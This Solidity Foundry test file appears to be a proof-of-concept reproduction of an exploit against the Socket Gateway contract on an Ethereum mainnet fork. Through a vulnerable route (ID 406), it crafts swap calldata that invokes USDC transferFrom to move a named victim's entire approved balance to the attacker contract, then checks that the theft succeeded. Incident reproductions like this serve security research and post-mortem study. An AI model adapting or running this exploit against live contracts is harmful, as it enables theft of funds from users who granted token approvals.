// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface ISocketGateway {
    function executeRoute(uint32 routeId, bytes calldata routeData) external payable returns (bytes memory);
}

interface ISocketVulnRoute {
    function performAction(
        address fromToken,
        address toToken,
        uint256 amount,
        address receiverAddress,
        bytes32 metadata,
        bytes calldata swapExtraData
    ) external payable returns (uint256);
}

contract SocketGatewayExp is Test {
    address _gateway = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
    uint32 routeId = 406; //Recently added vulnerable route id
    address targetUser = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;
    address _usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    ISocketGateway gateway = ISocketGateway(_gateway);
    IERC20 USDC = IERC20(_usdc);

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", 19_021_453);
        USDC.approve(_gateway, type(uint256).max);
    }

    function getCallData(address token, address user) internal view returns (bytes memory callDataX) {
        require(IERC20(token).balanceOf(user) > 0, "no amount of usdc for user");
        callDataX =
            abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), IERC20(token).balanceOf(user));
    }

    function getRouteData(address token, address user) internal view returns (bytes memory callDataX2) {
        callDataX2 = abi.encodeWithSelector(
            ISocketVulnRoute.performAction.selector,
            token,
            token,
            0,
            address(this),
            bytes32(""),
            getCallData(_usdc, user)
        );
    }

    function testExploit() public {
        gateway.executeRoute(routeId, getRouteData(_usdc, targetUser));
        require(USDC.balanceOf(address(this)) > 0, "no usdc gotten");
    }
}
